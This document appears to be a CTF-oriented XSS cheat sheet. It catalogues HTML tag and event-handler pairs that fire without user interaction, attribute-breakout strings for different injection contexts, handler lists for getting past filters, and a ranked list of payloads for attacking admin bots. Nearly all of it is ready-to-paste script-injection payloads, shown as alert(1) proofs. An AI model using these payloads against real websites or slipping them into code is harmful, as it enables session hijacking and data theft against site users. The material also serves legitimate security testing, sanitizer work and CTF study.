# Tag × event matrix — what fires, when, without interaction

The XSS event catalogue: which (tag, handler) pairs fire on page
load or by themselves, and which need a user action. "Auto" means
no click/hover/keystroke required — those are the payloads that
work against a bot.

---

## 1. Auto-firing — page load / resource error (THE bot payloads)

| Tag | Handler | Fires when |
|---|---|---|
| `<img src=x onerror=...>` | onerror | the src fails to load — always (src=x 404s) |
| `<svg onload=...>` | onload | element parsed — always |
| `<body onload=...>` | onload | body parsed |
| `<iframe onload=...>` | onload | frame load (even blank) |
| `<iframe src=x onerror=...>` | onerror | src fails |
| `<video><source onerror=...>` | onerror | source fails |
| `<audio><source onerror=...>` | onerror | source fails |
| `<audio src=x onerror=...>` | onerror | src fails |
| `<video src=x onerror=...>` | onerror | src fails |
| `<video poster=x onerror=...>` | onerror | poster fails (rare) |
| `<img src=x onerror=...>` | onerror | THE workhorse |
| `<input type=image src=x onerror=...>` | onerror | image-type input fails |
| `<link rel=stylesheet href=x onerror=...>` | onerror | css load fails (some browsers) |
| `<script src=x onerror=...>` | onerror | script 404 — need script allowed |
| `<object data=x onerror=...>` | onerror | object fails |
| `<embed src=x onerror=...>` | onerror | embed fails |
| `<details open ontoggle=...>` | ontoggle | `open` fires toggle — auto |
| `<marquee onstart=...>x</marquee>` | onstart | marquee begins — auto |
| `<marquee loop=1 onfinish=...>x</marquee>` | onfinish | after loop |
| `<video autoplay onend=...><source src=x>` | onend | video end (needs valid src) |
| `<video autoplay onerror=...>` | onerror | with bad src |
| `<audio autoplay onerror=...>` | onerror | with bad src |
| `<img src=x onload=...>` | onload | needs a LOADABLE src — use a real image or data URI |
| `<img srcset=x onerror=...>` | onerror | srcset resolution fails |

---

## 2. Auto-focus events — need `autofocus` (or contenteditable/tabindex)

| Tag | Handler | Needs |
|---|---|---|
| `<input autofocus onfocus=...>` | onfocus | autofocus honoured |
| `<select autofocus onfocus=...>` | onfocus | same |
| `<textarea autofocus onfocus=...>` | onfocus | same |
| `<button autofocus onfocus=...>` | onfocus | same |
| `<keygen autofocus onfocus=...>` | onfocus | same |
| `<video autofocus onfocus=...>` | onfocus | some browsers |
| `<audio autofocus onfocus=...>` | onfocus | some browsers |
| `<div contenteditable autofocus onfocus=...>` | onfocus | contenteditable makes div focusable |
| `<a href=# autofocus onfocus=...>` | onfocus | anchor + autofocus |
| `<xss autofocus tabindex=1 onfocus=...>` | onfocus | any tag with tabindex |
| `<div tabindex=1 onfocus=...>` + `#x` | onfocus | fragment targets focus |
| `<input autofocus onblur=...>` | onblur | fires when focus LEAVES — pair with another autofocus |

`autofocus` only fires on the FIRST autofocus element — the last
one in document order wins actually; reliably it's the FIRST in
source order that receives it. When multiple autofocus handlers
compete, only the honoured one fires — put yours first.

---

## 3. CSS-triggered events — animation/transition start

Need a stylesheet that starts an animation — either inject `style`
or use a page stylesheet that already defines one:

```html
<xss style="animation-name:x" onanimationstart="alert(1)">
<xss style="animation:x 1s" onanimationstart="alert(1)">
<xss style="animation:x" onanimationiteration="alert(1)">
<xss style="transition:all 1s" ontransitionstart="alert(1)">
<div style="animation:spin 1s" onanimationstart="alert(1)">
```

The `animation-name:x` works when the page already defines `@keyframes x` — otherwise inject BOTH:

```html
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)">
```

The `<xss>` is an arbitrary tag name — any element name works for
event handlers (the parser treats unknown tags as generic elements).

---

## 4. Scroll / viewport events — IntersectionObserver-adjacent

| Payload | Handler | Fires |
|---|---|---|
| `<div onscroll=...>x</div>` with overflow | onscroll | when scrolled — needs scroll to happen; combine with `style="overflow:auto;height:1px"` + autofocus-anchor scroll |
| `<a id=x href=#x>` fragment nav | — | browsers scroll to `#x` on load |
| `<img src=x onerror ...>` inside scrollable region | onerror | still auto |

Fragment-scroll trick: `page#x` where `id=x` is below the fold —
browser scrolls → elements with `onscroll`/`onfocus`+tabindex fire:

```html
<div id=x tabindex=1 onfocus=alert(1) style="margin-top:5000px">x</div>
   then visit page#x
```

---

## 5. Form-submission events — the "submit fires" family

```html
<form><button formaction=javascript:alert(1)>x</button></form>
<form action=javascript:alert(1)><input type=submit></form>
<form><input type=submit formaction=javascript:alert(1) value=x></form>
<form><input type=image src=x onerror=alert(1)></form>
<form><button onformaction=alert(1) formaction=x>y</button></form>
```

`formaction` hijacks the SUBMIT URL — needs a submit to happen
(user click or `.submit()` from other JS). Not auto unless another
trigger submits.

`<input type=image>` is special: it's an image-type submit — src
failure → onerror auto-fires (listed in §1).

---

## 6. User-interaction events — need a real user (not bot-usable)

| Handler | Fires on |
|---|---|
| onclick | click — accesskey `accesskey=x`+`Alt+Shift+X` simulates on some bots? no, still manual |
| onmouseover | hover |
| onmouseenter/onmouseleave | hover |
| onmousedown/onmouseup | click parts |
| ondblclick | double click |
| oncontextmenu | right-click |
| oncopy/oncut/onpaste | clipboard ops |
| onkeypress/onkeydown/onkeyup | keystroke — accesskey `Alt+Shift+X` can trigger on user keypress |
| oninput/onchange | form edits |
| onsubmit | form submit |
| ondrag/ondrop/ondragover | drag ops |
| onwheel/onmousewheel | scroll wheel |
| onpointerover/onpointerdown | pointer events |
| ontouchstart/ontouchend | touch |

Use these ONLY when the target is a real interactive user (stored
XSS on a page a moderator clicks). For a bot, stick to §1-§3.

---

## 7. Pseudo-user tricks — getting a bot to "click"

```html
<!-- autofocus + onfocus fires without click: -->
<input autofocus onfocus=alert(1)>

<!-- accesskey: user presses Alt+Shift+X — on some CTF bots the
     driver simulates it: -->
<a accesskey=x onclick=alert(1)>x</a>
<input accesskey=x onclick=alert(1)>

<!-- autofocus + scroll-into-view via fragment -->
<xss id=x tabindex=0 onfocus=alert(1) autofocus></xss>
```

The `accesskey` + fragment pair is the closest to "auto-click" —
still needs the keypress. Some bot harnesses press keys to wake the
page; worth trying but don't bet on it.

---

## 8. Tag-specific capabilities — which tags allow which attrs

| Tag | Special attrs | Notes |
|---|---|---|
| `<a>` | href, ping, download | ping=beacon exfil |
| `<img>` | src, srcset, onerror, onload, lowsrc, dynsrc | onerror workhorse |
| `<svg>` | onload, all events, animate/set tags | XML-in-HTML |
| `<math>` | maction, href | MathML quirks |
| `<iframe>` | src, srcdoc, onload | srcdoc = nested doc |
| `<video>` `<audio>` | src, poster, autoplay, onerror, onend, onloadstart | autoplay chains |
| `<source>` | src, onerror | inside media |
| `<track>` | src, onerror, default | captions |
| `<object>` | data, onerror, codebase | plugin-ish |
| `<embed>` | src, onerror | plugin-ish |
| `<script>` | src, onerror, onload | needs script allowed |
| `<link>` | href, rel, onload, onerror | stylesheet/prefetch |
| `<style>` | content | css block |
| `<meta>` | http-equiv=refresh → url= | redirect |
| `<base>` | href | hijacks all relative URLs |
| `<form>` | action, formaction | submit target |
| `<input>` | autofocus, type=image, src | |
| `<button>` | autofocus, formaction | |
| `<select>` | autofocus | |
| `<textarea>` | autofocus | |
| `<keygen>` | autofocus | deprecated but works |
| `<details>` | open, ontoggle | open+ontoggle auto |
| `<marquee>` | onstart, onfinish, loop | auto-fires |
| `<body>` | onload, onpageshow, onresize... | document-level events |
| `<html>` | onfocus, events | rare |
| `<xss>`/arbitrary | any handler, style | unknown-tag payloads |
| `<isindex>` | action, prompt | ancient — some parsers still honour |
| `<applet>` | code | dead, java |
| `<frame>` `<frameset>` | src, onload | frameset context |
| `<bgsound>` | src | IE-era |

---

## 9. The "fires without src" handlers — no resource needed

```html
<svg onload=alert(1)>               -- no src needed
<details open ontoggle=alert(1)>    -- open attr is the trigger
<marquee onstart=alert(1)>x</marquee>
<input autofocus onfocus=alert(1)>
<body onload=alert(1)>
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=alert(1)>
<iframe onload=alert(1)>            -- blank iframe still loads
<object onerror=alert(1)>           -- object with no data errors
```

---

## 10. When the tag is fixed but attributes are yours

You can't add a tag — the injection lands INSIDE an existing tag
as an attribute. Tag-by-tag best handler:

| You land inside... | Add |
|---|---|
| `<img src="{v}">` | `" onerror="alert(1)` |
| `<input value="{v}">` | `" autofocus onfocus="alert(1)` |
| `<div title="{v}">` | `" style="animation-name:x" onanimationstart="alert(1)` + css elsewhere — or `contenteditable autofocus onfocus` |
| `<a href="{v}">` | `javascript:alert(1)` |
| `<iframe src="{v}">` | `javascript:alert(1)` or `" srcdoc="<script>alert(1)</script>` |
| `<script>var x="{v}"` | `";alert(1);//` or `</script><img src=x onerror=alert(1)>` |
| `<video src="{v}">` | `" onerror="alert(1)` |
| `<select><option>{v}</option>` | `</select><img src=x onerror=alert(1)>` — breakout wins |
| `<textarea>{v}</textarea>` | `</textarea><img src=x onerror=alert(1)>` |
| `<title>{v}</title>` | `</title><img src=x onerror=alert(1)>` |
| `<div data-x="{v}">` | `" onmouseover="alert(1)` (interaction) or `" style="animation-...` |
| `<!-- {v} -->` | `--><img src=x onerror=alert(1)>` |

---

## 11. Event fire reliability notes

- `onerror` on `<img src=x>` is THE most reliable — x never
  resolves, error always fires, works on every browser.
- `<svg onload>` is the second — no network needed at all.
- `autofocus onfocus` works on the FIRST autofocus element only —
  if the page already has one, yours loses.
- `details open ontoggle` fires when `open` is present at parse.
- `marquee` — Chrome-only-ish but near-universal in CTF browsers.
- `onanimationstart` needs a `@keyframes` definition somewhere —
  inject `<style>@keyframes x{}</style>` first if absent.
- `<object onerror>` fires only when `data`/`codebase` fails.
- Mutation events (DOMSubtreeModified etc.) — dead, removed.
- `onfocus` on document/body: `<body onfocus=alert(1)>` + any
  focus event — fires when the window gains focus; bots often
  blur/focus — unreliable, don't lead with it.

---

## 12. Complete handler-event reference — every `on*` worth trying

When a filter kills specific handler names, rotate through this
list. Autofire = fires without user interaction in a normal render.

### Load/error events — autofire

| Tag + handler | Fires when | Reliability |
|---|---|---|
| `<img src=x onerror>` | bad src, always | ★★★★★ |
| `<svg onload>` | element parse | ★★★★★ |
| `<body onload>` | document load | ★★★★★ |
| `<iframe onload>` | frame load | ★★★★★ |
| `<video><source onerror>` | source fail | ★★★★ |
| `<video src=x onerror>` | media fail | ★★★★ |
| `<audio src=x onerror>` | media fail | ★★★★ |
| `<img srcset=x onerror>` | srcset fail | ★★★★ |
| `<image href=x onerror>` (svg) | image fail | ★★★★ |
| `<object onerror>` | data fail | ★★★ |
| `<embed onerror>` | plugin fail | ★★★ (deprecated) |
| `<script onerror src=x>` | script fail | ★★★ |
| `<link rel=stylesheet onerror href=x>` | css fail | ★★★ |
| `<input type=image src=x onerror>` | image fail | ★★★★ |
| `<track src=x onerror>` inside video | track fail | ★★ |
| `<marquee onstart>` | marquee start | ★★★★ (Chrome) |
| `<marquee onfinish>` | after start+loop | ★★ |
| `<details open ontoggle>` | open at parse | ★★★★ |
| `<dialog open>` + `onclose` | needs close() | ★★ |
| `<svg><animate onbegin>` | animation begin | ★★★ (SMIL) |
| `<svg><set onbegin>` | set begin | ★★ |
| `<svg onbegin>` | svg SMIL begin | ★★ |

### Focus events — autofire only with `autofocus`

| Tag + handler | Fires when |
|---|---|
| `<input onfocus autofocus>` | autofocus at parse |
| `<input onfocusin autofocus>` | focusin variant |
| `<select onfocus autofocus>` | same |
| `<textarea onfocus autofocus>` | same |
| `<button onfocus autofocus>` | same |
| `<a href=# onfocus autofocus>` | same |
| `<keygen onfocus autofocus>` | legacy Chrome |
| `<iframe onfocus autofocus>` | focus variant |
| `document.body onfocus` | window focus — bots blur/focus unpredictably |
| `contenteditable onfocus autofocus` | editable elem + autofocus |
| `<div tabindex=0 onfocus autofocus>` | tabindex trick on any tag |

Multiple autofocus elements: only the FIRST wins. If the page already
has autofocus (a search box), your autofocus never fires — check the
host page for existing `autofocus` attrs before relying on this.

### Pointer/hover events — interaction required

```html
onmouseover  onmouseenter  onmousemove  onmouseout
onclick      onauxclick    oncontextmenu  ondblclick
onpointerover  onpointerenter  onpointerdown  onpointerup
ontouchstart  ontouchend  ontouchmove     -- mobile bots
ondragstart  ondragend  ondrop
```

For bots: treat as dead unless the challenge guarantees interaction.
Exception: a `<a href=javascript:>` on a link the BOT clicks — some
bots click the first link; formaction on submit-buttons the bot
submits.

### Keyboard/input events

```html
onkeypress onkeydown onkeyup            -- needs typing
oninput onchange oninvalid               -- form events
oninvalid — fires on form SUBMIT when a required field is empty:
<form><input required oninvalid=alert(1)><input type=submit></form>
   -- bot that submits the form triggers it
```

### Media/scroll/misc events

```html
<video onplay autoplay><source src=x>    -- autoplay + onplay
<video autoplay onplaying=alert(1) src=valid.mp4>  -- needs real media
<audio autoplay onplay=alert(1) src=x>
<details ontoggle open>                  -- covered above
<div onscroll=alert(1) style="overflow:scroll;height:10px"><br>x200</div>
   -- scroll fires only if user/JS scrolls
<body onpageshow=alert(1)>               -- fires on page show — good!
<body onpageshow=alert(1)>               -- like onload, plus bfcache
window.onhashchange — needs hash change
<body onresize> — needs resize
<body onblur>/<body onfocus> — window focus events, unreliable for bots
```

### SMIL/SVG animation events

```xml
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x>
<svg><animate onend=alert(1) dur=0.01s attributeName=x>
<svg><a><animate attributeName=href values="javascript:alert(1)" begin="0s">
   -- animate CAN morph href into javascript: on timer
```

### The rare-but-real ones

```html
<object data=x onerror=alert(1)>             -- object error
<embed onerror=alert(1) src=x>               -- deprecated
<math><maction actiontype=statusline xlink:href=javascript:alert(1)>X</maction></math>
<svg><a><animate attributeName=href values=javascript:alert(1)><text>x</text></a></svg>
<svg><use href="data:image/svg+xml;base64,...#x"></use></svg>
<table background=javascript:alert(1)>       -- dead modern
<isindex type=image src=x onerror=alert(1)>  -- dead
<form><button popovertarget=x>x</button><div id=x popover onbeforetoggle=alert(1)>
   -- popover API events — onbeforetoggle fires on show
<div popover id=x onbeforetoggle=alert(1)></div><button popovertarget=x>y</button>
```

---

## 13. Autofire priority order for admin-bots

```text
1. <svg onload=alert(1)>                    -- zero deps, zero network
2. <img src=x onerror=alert(1)>             -- error guaranteed
3. <body onload=alert(1)>                   -- needs body-context
4. <input autofocus onfocus=alert(1)>        -- loses to existing autofocus
5. <details open ontoggle=alert(1)>          -- parse-time toggle
6. <marquee onstart=alert(1)>                -- Chrome ok
7. <iframe onload=alert(1)>                  -- needs iframe allowed
8. <video><source onerror=alert(1)>          -- nested variant
9. <meta refresh url=javascript:>           -- navigation-based
10. <svg><animate onbegin=alert(1)...>       -- SMIL, some sanitizers miss
```
